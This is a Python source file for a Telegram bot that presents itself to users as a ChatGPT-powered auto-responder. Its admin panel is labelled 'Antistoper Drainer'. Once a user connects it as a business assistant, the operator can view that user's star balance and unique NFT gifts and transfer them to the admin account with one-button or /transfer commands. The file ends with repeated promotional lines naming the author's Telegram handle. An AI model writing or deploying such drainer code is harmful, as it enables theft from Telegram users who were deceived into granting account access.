from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, business_connection, BusinessConnection
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.enums import ParseMode
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import ConvertGiftToStars, convert_gift_to_stars


from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
import gpt_answer

import aiogram.exceptions as exceptions
import logging
import asyncio
import json

import re

import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    # Пример: загружаем из файла или словаря
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Пользователь #{user_id} подключил бота.")
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил моего бота как бизнес-ассистента.")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
        save_business_connection_data(business_connection)

        logging.info(f"Бизнес-аккаунт подключен: {business_connection.user.id}, connection_id: {business_connection}")
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения.")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id

        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)

        if not connection:
            print(f"Неизвестный бизнес connection_id: {conn_id}")
            return

        owner_id = connection["user_id"]

        if sender_id != owner_id:
            await bot.send_message(business_connection_id=message.business_connection_id,
                                chat_id=message.from_user.id, text=f"<b>Привет! Я сейчас оффлайн, поэтому за меня ответит ChatGPT4:</b>\n\n{gpt_answer.generate(message.text)}", parse_mode="HTML")
    except Exception as e:
       logging.exception("Ошибка при ответе.")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(f"Добро пожаловать в автоответчик на ChatGPT4!\nПросто подключите меня как бизнес бота, и я начну отвечать за вас!")
    else:
        await message.answer(f"Antistoper Drainer\n\n🔗 Количество подключений: {count}\n\n/gifts - просмотреть гифты\n/stars - просмотреть звезды\n/transfer <owned_id> <business_connect> - передать гифт вручную\n/convert - конвертировать подарки в звезды")

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_handler(message: Message, bot):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return
    
    try:
        args = message.text.strip().split()
        if len(args) != 3:
            return await message.answer("Используй формат: /transfer <owned_gift_id> <business_connection_id>")

        owned_gift_id = args[1]
        connection_id = args[2]
        if not connection_id:
            return await message.answer("❌ Нет активного бизнес-подключения.")

        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))

        await message.answer("✅ Подарок успешно передан тебе!")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await message.answer(f"Ошибка: {e}")
    except TelegramBadRequest as e:
        await message.answer(f"❌ Ошибка передачи: {e.message}")
    except Exception as e:
        await message.answer(f"⚠️ Неизвестная ошибка: {e}")

@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("Нет доступа.")
        return

    try:
        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        if not connections:
            await message.answer("Нет подключённых бизнес-аккаунтов.")
            return

        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(
                text=name,
                callback_data=f"gifts:{user_id}"
            )

        await message.answer("Выбери пользователя:", reply_markup=kb.as_markup())

    except FileNotFoundError:
        await message.answer("Файл подключений не найден.")
    except Exception as e:
        logging.exception("Ошибка при загрузке подключений")
        await message.answer(f"Ошибка при загрузке подключений")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()

    user_id = int(callback.data.split(":", 1)[1])

    try:
        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)

        if not connection:
            await callback.message.answer("Подключение для этого пользователя не найдено.")
            return

        business_connection_id = connection["business_connection_id"]

        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"🆔 Бизнес коннект: <b>{business_connection_id}</b>\n⭐️ Баланс звёзд: <b>{star_balance.star_amount}</b>\n\n"
        await callback.message.answer(text, parse_mode="HTML")

        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            text += "🎁 Нет подарков."
            await callback.message.answer(text)
        else:
            for gift in gifts.gifts:
                if gift.type == "unique":
                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"🎁 <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"🆔 Модель: <code>{gift.gift.model.name}</code>\n\n\n⭐️ Стоимость трансфера: {gift.transfer_star_count} ⭐️"
                    )
                    kb = InlineKeyboardMarkup(
                            inline_keyboard=[
                                [
                                    InlineKeyboardButton(
                                        text="🎁 Передать мне",
                                        callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}"
                                    )
                                ]
                            ]
                        )
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        logging.exception("Ошибка при получении данных по бизнесу")
        await callback.message.answer(f"Ошибка: {e}")

@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()

    if callback.from_user.id != ADMIN_ID:
        await callback.message.reply("Нет доступа.")
        return

    try:
        _, user_id_str, gift_id, transfer_price = callback.data.split(":")
        user_id = int(user_id_str)

        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("Подключение не найдено.")
            return

        business_connection_id = connection["business_connection_id"]

        result = await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=gift_id,
            star_count=transfer_price
        ))

        if result:
            await callback.message.answer("🎉 Подарок успешно передан тебе!")
        else:
            await callback.message.answer("⚠️ Не удалось передать подарок.")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("⚠️ Пользователь запретил доступ к гифтам!")
        else:
            await callback.message.answer(f"Ошибка: {e}")
    except Exception as e:
        logging.exception("Ошибка при передаче подарка")
        await callback.message.answer(f"Ошибка: {e}")


my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks my telegram @Clof1ks             my telegram @Clof1ks

               
my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks
my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks                      my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks
                                                    my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks

s
       my telegram @Clof1ks                                  my telegram @Clof1ks             my telegram @Clof1ks

                      my telegram @Clof1ks


